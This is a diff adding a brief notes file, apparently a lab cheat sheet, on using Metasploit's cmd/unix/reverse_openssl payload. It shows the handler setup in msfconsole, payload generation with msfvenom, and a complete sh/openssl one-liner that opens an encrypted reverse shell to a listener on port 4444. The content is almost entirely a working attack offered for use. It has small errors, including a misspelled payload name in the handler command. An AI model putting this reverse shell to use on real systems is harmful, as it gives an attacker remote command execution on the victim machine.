@@ -1,0 +1,31 @@
+cmd/unix/reverse_openssl
+
+
+server 192.168.138.142
+
+msfconsole
+Use exploit/multi/handler
+Set payload cmd/unix/reverse_opensll
+Set LHOST 0.0.0.0
+Exploit
+
+
+
+client 192.168.138.141
+
+msfvenom.bat -p cmd/unix/reverse_openssl LHOST=192.168.138.142
+
+sh -c '(sleep 3849|openssl s_client -quiet -connect 192.168.138.142:4444|while : ; do sh && break; done 2>&1|openssl s_client -quiet -connect 192.168.138.142:4444 >/dev/null 2>&1 &)'
+
+
+
+
+
+
+
+
+
+
+
+
+
